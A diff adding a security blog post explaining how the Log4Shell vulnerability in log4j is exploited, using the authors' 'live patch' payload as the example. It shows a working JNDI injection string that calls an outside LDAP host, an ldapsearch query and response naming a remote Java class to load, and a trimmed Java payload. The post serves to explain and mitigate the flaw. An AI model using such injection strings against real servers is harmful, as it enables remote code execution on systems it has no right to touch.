@@ -1,0 +1,225 @@
+---
+title: "Understanding Log4Shell via Exploitation and Live Patching (CVE-2021-44228 + CVE-2021-45046)"
+description: Let's dig into how it's possible to send a string to your server and have it patch a vulnerability.
+slug: log4shell-live-patch-technical
+date: 2021-12-16
+image: https://www.lunasec.io/docs/img/log4shell-logo.png
+keywords: [log4shell, log4j, log4j2, rce, java, zero-day, mitigation]
+authors: [free, chris]
+
+---
+<!--
+  ~ Copyright by LunaSec (owned by Refinery Labs, Inc)
+  ~
+  ~ Licensed under the Creative Commons Attribution-ShareAlike 4.0 International
+  ~ (the "License"); you may not use this file except in compliance with the
+  ~ License. You may obtain a copy of the License at
+  ~
+  ~ https://creativecommons.org/licenses/by-sa/4.0/legalcode
+  ~
+  ~ See the License for the specific language governing permissions and
+  ~ limitations under the License.
+  ~
+-->
+
+![Log4Shell Logo](https://www.lunasec.io/docs/img/log4shell-logo.png)
+
+## Technical Analysis: Understanding the Live Patch
+
+The other day we published a Log4Shell payload that, when used to exploit a server, would patch the server against
+future exploitation from Log4Shell. You can read through our post explaining _why_ we built it
+[here](https://www.lunasec.io/docs/blog/log4shell-live-patch/).
+
+It looks like this:
+```
+${jndi:ldap://patch.log4shell.com:1389/a}
+```
+
+In this post, we're going to dissect what's going on with this live patch to explain how it works. If you're curious to
+dig into this more, you can view the code on
+[GitHub](https://github.com/lunasec-io/lunasec/tree/master/tools/log4shell) too.
+
+<!--truncate-->
+
+## The Payload Schema
+
+A simple Log4Shell attack follows a specific structure. We're going to break down our patch payload (above) into it's
+composite parts:
+
+
+- `${`: The open tag for the log4j "Message Lookup",
+- `jndi:`: Specifying to log4j to use the "JNDI Manager" to resolve the message,
+- `ldap://`: Tells the JNDI request to be resolved using the LDAP protocol,
+- `patch.log4shell.com`: The host to resolve via DNS to send the payload towards,
+- `:1389`: The port to send the request to,
+- `/a`: The path to send to the server with the request,
+- `}`: The closing tag for the original log4j "Message Lookup".
+
+_Note: There are more advanced payloads, but they all distill down to something similar to this._
+
+## High-Level Exploit Steps
+
+To perform the exploit, the following steps are completed in this sequence:
+
+1. A log is passed to log4j via `log.info("${jndi:ldap://patch.log4shell.com:1389/a}")`,
+2. A "Message Lookup" is parsed by log4j to be interpreted,
+3. The JNDI Manager is invoked and passed the LDAP URI,
+4. The LDAP Server is queried via the URI,
+5. The response is downloaded and passed to the JNDI Manager,
+6. The JNDI Manager loads the response data as Java bytecode into the Java process,
+7. When loading the Java code, the `getObjectInstance` method is called since the loaded class is an `ObjectFactory`
+   (alternatively, the payload code can be wrapped in a static context with `static {}` which will be triggered upon loading the class),
+8. At this point, an attacker can perform whatever logic they'd like because they have full code execution.
+
+Here is a diagram with roughly the same information, but explained visually (with mitigation info).
+
+<a href="https://www.lunasec.io/docs/img/log4j-attack-and-mitigations.png" target="_blank" rel="noopener">
+  <img src="https://www.lunasec.io/docs/img/log4j-attack-and-mitigations.png" alt="log4shell 0day diagram" />
+</a>
+
+## The LDAP Lookup
+
+Once Log4j has parsed the message, the LDAP request is the first leg of the exploit that an attacker must implement in
+order to attain RCE.
+
+We're going to use the CLI tool `ldapsearch` to allow us to emulate the request being made from within Log4j to the
+LDAP server. With this tool, we can query the live patch server for its entries:
+
+```shell
+~ ldapsearch -x -H ldap://patch.log4shell.com:1389
+# extended LDIF
+#
+# LDAPv3
+# base <> (default) with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+#
+dn:: Y249bG9nNHNoZWxsLWhvdHBhdGNoLCA=
+cn: log4shell-hotpatch
+javaClassName: attempting to patch Log4Shell vulnerability with payload hosted
+  on: http://patch.log4shell.com:80/Log4ShellHotpatch.class
+javaCodeBase: http://patch.log4shell.com:80/
+objectclass: javaNamingReference
+javaFactory: Log4ShellHotpatch
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+```
+
+The most important parts of this response data are the `javaCodeBase` and the `javaFactory` fields. These tell the JNDI
+function where to locate the code (`http://patch.log4shell.com:80/`) and what remote class to resolve
+(`Log4ShellHotpatch`). In Log4j versions `>= 2.15.0`, `javaCodeBase` will only be resolved if it is [`localhost` or a
+whitelisted host](https://github.com/apache/logging-log4j2/pull/608) meaning this payload will not execute.
+
+### Other Response Values
+
+For the most part, the other response values exist only to pass the LDAP schema validation step and aren't crucial for
+the exploit to succeed.
+
+For example, the `javaClassName` contains a value which will be logged out when running the live patch on a system. This
+log message will indicate that the second stage Java class file is being downloaded:
+`http://patch.log4shell.com:80/Log4ShellHotpatch.class`.
+
+We only have added this for debugging to understand if this payload was ever actually executed, but it could be
+substituted with any string value.
+
+## The JNDI Request
+
+With the information now available to tell JNDI where to load the exploit code from, the next request in the exploit
+chain is fired off. The response from this request is contains Java bytecode which enables the actual RCE
+functionality of this vulnerability.
+
+Java bytecode is easily reversible, and we are not making any attempt to [obfuscate the payload](https://owasp.org/www-community/controls/Bytecode_obfuscation).
+Using a tool such as [jdec.app](https://jdec.app/), you can simply download the payload and then reverse engineer it to understand
+exactly what code will be run when the exploit is triggered.
+
+![Log4Shell live patch payload decompiled](https://www.lunasec.io/docs/img/log4shell-live-patch-decompilation.png)
+
+You can alternatively just browse the payload's source on (
+[GitHub](https://github.com/lunasec-io/lunasec/blob/master/tools/log4shell/payloads/hotpatch-payload/src/main/java/Log4ShellHotpatch.java)
+).
+
+```ts
+/* ... imports redacted for brevity ... */
+
+public class Log4ShellHotpatch implements ObjectFactory {
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
+        log("Attempting to apply Log4Shell hotpatch to service...");
+        try {
+            // reconfiguring log4j
+            boolean success = removeJndiFromLog4jContextLookup();
+            if (success) {
+                return "Successfully hotpatched Log4Shell vulnerability.";
+            }
+        } catch (Exception e) {
+            error(e.toString());
+            e.printStackTrace();
+        }
+        return "Unable to hotpatch Log4Shell vulnerability.";
+    }
+
+    static boolean removeJndiFromLog4jContextLookup() {
+      /* ... trimmed code, see GitHub for full example ... */
+    }
+
+    /* ... other methods trimmed too ... */
+}
+```
+
+## The Java Exploit Code
+
+Upon loading the second stage Java class file into the program, the class `Log4ShellHotpatch` will start performing the
+in memory patch when the `getObjectInstance()` function is invoked during object creation by JNDI.
+
+The patch consists of the following steps:
+
+1. Accesses the current thread's `ClassLoader` and locates the classes for:
+  - `org.apache.logging.log4j.core.config.Configurator` and,
+  - `org.apache.logging.log4j.core.impl.Log4jContextFactory`
+3. Calls `ContextSelector ctxSelector = Log4jContextFactory.getSelector(Configurator.getFactory());`
+4. Grabs all `LoggerContext` objects with `ctxSelector.getLoggerContexts()`
+5. Goes through each `LoggerContext` and removes the `jndi` entry in each object's lookup map
+
+The last step of the patch is what prevents further resolution of `jndi` values during log4j logging calls.
+
+## Stay Updated
+
+Please follow us on [Twitter](https://twitter.com/LunaSecIO) or add yourself to our mailing list below, and we'll
+update you when we publish new findings.
+
+And if this post helped you, please share it with others to help them too.
+
+import ContactForm from '../src/components/ContactForm.jsx'
+
+<ContactForm/>
+
+## More Information
+
+We have published a series of posts about Log4Shell on our blog that you might be interested in:
+- **[Part 1: Log4Shell Live Patch (Background Context)](https://www.lunasec.io/docs/blog/log4shell-live-patch/)**,
+- **[Mitigation Guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/)**,
+- **[Original Log4Shell Announcement](https://www.lunasec.io/docs/blog/log4j-zero-day/)**,
+- **[Explanation of the 2nd Log4j CVE](https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/)**
+
+### Limited Offer: Free Security Assistance
+
+We're also currently offering a free 30-minute consultation with one of our Security Engineers. If you're interested,
+please [book some time with us here](https://lunasec.youcanbook.me/).
+
+## Updates
+
+:::info
+We're continuously keeping this post up-to-date as new information comes out. If you have any questions, or you're
+confused about our advice, please [file an issue](https://github.com/lunasec-io/lunasec/issues) on GitHub.
+
+If you would like to contribute, or notice any errors, this post is an Open Source Markdown file on
+[GitHub](https://github.com/lunasec-io/lunasec/blob/master/docs/blog/2021-12-15-log4shell-live-patch.mdx).
+:::
+
